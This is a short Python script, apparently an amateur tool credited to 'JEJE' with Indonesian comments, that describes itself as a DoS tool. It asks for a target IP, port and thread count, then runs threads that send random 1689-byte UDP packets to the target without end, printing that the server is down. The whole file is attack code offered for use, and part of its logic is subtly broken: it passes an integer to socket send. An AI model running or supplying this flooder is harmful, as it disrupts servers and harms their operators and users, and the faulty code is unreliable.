#BY JEJE
#CODE BASIC BY LyteVV
import random
import socket
import threading

#SUBSCRIBE WASU:SAMP
#JANGAN ABUSE KONTOL AWS AJA YA!
#JANGAN DI JUAL/RECODE INI TOOLS DOS
#SALAM DARI JEJE SMK DOS1

print('''
░░░░░██╗███████╗░░░░░██╗███████╗
░░░░░██║██╔════╝░░░░░██║██╔════╝
░░░░░██║█████╗░░░░░░░██║█████╗░░
██╗░░██║██╔══╝░░██╗░░██║██╔══╝░░
╚█████╔╝███████╗╚█████╔╝███████╗
░╚════╝░╚══════╝░╚════╝░╚══════╝
''')
target_server = str(input("[ -> ] SERVER IP:")) 
port_server = int(input("[ -> ] SERVER PORT:")) 
mengirim_request = int(input("[ -> ] PACKET:")) 
mengirim_thread = int(input("[ -> ] PACKET DIKIRIM:")) 

def attack():
    urandom_disini = random._urandom(1689) 
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target_server,port_server))
            s.send(urandom_disini)
            for x in range(mengirim_request):
                s.send(mengirim_thread)
            print("Unable Coonect To Server", target_server, ", Server Connect Down! ", port_server)
        except:
            s.close()

for y in range(mengirim_thread):
    th = threading.Thread(target = attack)
    th.start()